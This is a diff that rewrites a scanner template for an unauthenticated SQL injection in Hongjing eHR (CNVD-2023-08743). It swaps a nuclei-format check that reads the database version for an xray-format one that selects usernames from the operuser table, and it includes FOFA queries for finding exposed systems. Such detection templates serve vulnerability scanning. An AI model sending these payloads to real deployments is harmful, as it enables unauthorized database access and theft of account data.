@@ -1,32 +1,28 @@
-http:
-- matchers:
-  - condition: and
-    dsl:
-    - status_code == 200
-    - contains(header,"text/xml")
-    - contains_all(body,"TreeNode id=\"hongjing","SQL Server")
-    type: dsl
-  raw:
-  - 'GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d
-    HTTP/1.1
-
-    Host: {{Hostname}}
-
-    '
 id: CNVD-2023-08743
+
 info:
-  author: SleepingBag945
-  description: There is a SQL injection vulnerability in the categories of Hongjing
-    Human Resource Management System, from which attackers can obtain sensitive database
-    information.
-  metadata:
-    fofa-query: "title=\"\u4EBA\u529B\u8D44\u6E90\u4FE1\u606F\u7BA1\u7406\u7CFB\u7EDF\
-      \""
-    max-request: 1
-    verified: true
-  name: Hongjing Human Resource Management System - SQL Injection
+  name: 宏景 eHR SQL 注入漏洞
+  author: oxsonder
+  severity: high
+  verified: true
+  description: |
+    宏景人力系统 存在SQL注入漏洞(CNVD-2023-08743)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。
+    fofa: body='<div class="hj-hy-all-one-logo"'
   reference:
-  - https://www.henry4e36.top/index.php/archives/162.html
-  - https://blog.csdn.net/qq_41904294/article/details/130944159
-  severity: critical
-  tags: cnvd2023,cnvd,hongjing,hcm,sqli
+    - https://mp.weixin.qq.com/s/NhJe4MUepwqc6SmDJw4aow
+    - https://mp.weixin.qq.com/s/N5qe_tuqRC1QxwX6RvvXeg
+  tags: hjsoft,cve,cve2023,sqli
+  created: 2023/06/22
+
+set:
+  randstr: randomLowercase(12)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'TreeNode id=') &&
+      response.body.bcontains(b'text=')
+expression: r0()
